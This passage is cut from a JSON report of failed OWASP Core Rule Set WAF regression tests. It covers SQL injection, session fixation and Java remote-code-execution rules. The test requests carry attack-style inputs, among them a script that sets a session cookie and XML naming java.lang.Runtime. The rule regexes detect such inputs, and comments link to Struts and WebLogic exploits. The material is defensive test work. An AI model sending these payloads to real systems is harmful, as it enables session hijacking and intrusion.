            "expect_ids" : [ 942522 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942522,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Complementary rule to PL2 942521 that block escaped quotes followed by (and|or)"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "^.*?\\x5c['\\\"`](?:.*?['\\\"`])?\\s*(?:and|or)\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942522
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Detects basic SQL authentication bypass attempts 4.1/4"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "943100",
    "test_id" : 1,
    "test_path" : "REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION/943100.yaml",
    "description" : "Session Fixation Attack (943100) from old modsec regressions",
    "cause" : "failed expect_id check: 943100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Session Fixation Attack (943100) from old modsec regressions",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate",
            "Accept-Language" : "zh-sg",
            "Host" : "localhost",
            "Keep-Alive" : "300",
            "Proxy-Connection" : "keep-alive",
            "Referer" : "http",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/foo.php?bar=blah<script>document.cookie=\"sessionid=1234;%20domain=.example.dom\";</script>",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 943100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 943100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Session fixation"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ References ]=-"
        }, {
          "type" : "Comment",
          "text" : " http://projects.webappsec.org/Session-Fixation"
        }, {
          "type" : "Comment",
          "text" : " http://projects.webappsec.org/w/page/13246960/Session%20Fixation"
        }, {
          "type" : "Comment",
          "text" : " http://capec.mitre.org/data/definitions/61.html"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i:\\.cookie\\b.*?;\\W*?(?:expires|domain)\\W*?=|\\bhttp-equiv\\W+set-cookie\\b)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 943100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Session Fixation Attack: Setting Cookie Values in HTML"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-fixation"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SESSION-FIXATION"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/21/593/61"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.session_fixation_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "943110",
    "test_id" : 4,
    "test_path" : "REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION/943110.yaml",
    "description" : "Session Fixation Attack (943110) from old modsec regressions",
    "cause" : "failed no_expect_ids check: 943110 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=943110 - Possible Session Fixation Attack: SessionID Parameter Name with Off-Domain Referer" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "Session Fixation Attack (943110) from old modsec regressions",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate",
            "Accept-Language" : "zh-sg",
            "Content-Type" : "application/x-www-form-urlencoded",
            "Host" : "localhost",
            "Referer" : "http://localhost/test",
            "Keep-Alive" : "300",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/login.php?jsessionid=74B0CB414BD77D17B5680A6386EF1666",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 943110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 943110,
      "phase" : 2,
      "chain" : true,
      "comment_block" : null,
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "^(?:jsessionid|aspsessionid|asp\\.net_sessionid|phpsession|phpsessid|weblogicsession|session_id|session-id|sessionid|cfid|cftoken|cfsid|jservsession|jwsession|_flask_session|_session_id|connect\\.sid|laravel_session)$"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 943110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Session Fixation Attack: SessionID Parameter Name with Off-Domain Referer"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.943110_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-fixation"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SESSION-FIXATION"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/21/593/61"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.943110_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944100",
    "test_id" : 11,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944100.yaml",
    "description" : "XML element includes keywords java.lang.Runtime",
    "cause" : "failed no_expect_ids check: 944100 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944100 - Remote Command Execution: Suspicious Java class detected", "phase=2 rule_id=944100 - Remote Command Execution: Suspicious Java class detected", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944130 - Suspicious Java class detected", "phase=2 rule_id=944130 - Suspicious Java class detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "XML element includes keywords java.lang.Runtime",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><java.lang.Runtime attribute_name=\"attribute_value\">value</java.lang.Runtime></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -= Paranoia Level 1 (default) =- (apply only when tx.detection_paranoia_level is sufficiently high: 1 or higher)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-5638 - Exploit tested: https://github.com/xsscx/cve-2017-5638 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts Remote Code Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9791 - Exploit tested: https://www.exploit-db.com/exploits/42324 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts Remote Code Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9805 - Exploit tested: https://www.exploit-db.com/exploits/42627 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Oracle WebLogic Remote Command Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Oracle WebLogic vulnerability CVE-2017-10271 - Exploit tested: https://www.exploit-db.com/exploits/43458 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "java\\.lang\\.(?:runtime|processbuilder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Suspicious Java class detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944100",
    "test_id" : 12,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944100.yaml",
    "description" : "XML attribute name includes keywords java.lang.Runtime",
    "cause" : "failed no_expect_ids check: 944100 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944100 - Remote Command Execution: Suspicious Java class detected", "phase=2 rule_id=944100 - Remote Command Execution: Suspicious Java class detected", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944130 - Suspicious Java class detected", "phase=2 rule_id=944130 - Suspicious Java class detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected" ]
    },
    "test" : {
      "test_id" : 12,
      "desc" : "XML attribute name includes keywords java.lang.Runtime",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element java.lang.Runtime=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -= Paranoia Level 1 (default) =- (apply only when tx.detection_paranoia_level is sufficiently high: 1 or higher)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-5638 - Exploit tested: https://github.com/xsscx/cve-2017-5638 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts Remote Code Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9791 - Exploit tested: https://www.exploit-db.com/exploits/42324 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts Remote Code Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9805 - Exploit tested: https://www.exploit-db.com/exploits/42627 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Oracle WebLogic Remote Command Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Oracle WebLogic vulnerability CVE-2017-10271 - Exploit tested: https://www.exploit-db.com/exploits/43458 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "java\\.lang\\.(?:runtime|processbuilder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Suspicious Java class detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944100",
    "test_id" : 15,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944100.yaml",
    "description" : "XML element includes keywords java.lang.ProcessBuilder",
    "cause" : "failed no_expect_ids check: 944100 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944100 - Remote Command Execution: Suspicious Java class detected", "phase=2 rule_id=944100 - Remote Command Execution: Suspicious Java class detected", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944130 - Suspicious Java class detected", "phase=2 rule_id=944130 - Suspicious Java class detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected" ]
    },
    "test" : {
      "test_id" : 15,
      "desc" : "XML element includes keywords java.lang.ProcessBuilder",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><java.lang.ProcessBuilder attribute_name=\"attribute_value\">value</java.lang.ProcessBuilder></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -= Paranoia Level 1 (default) =- (apply only when tx.detection_paranoia_level is sufficiently high: 1 or higher)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-5638 - Exploit tested: https://github.com/xsscx/cve-2017-5638 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts Remote Code Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9791 - Exploit tested: https://www.exploit-db.com/exploits/42324 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts Remote Code Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9805 - Exploit tested: https://www.exploit-db.com/exploits/42627 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Oracle WebLogic Remote Command Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Oracle WebLogic vulnerability CVE-2017-10271 - Exploit tested: https://www.exploit-db.com/exploits/43458 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
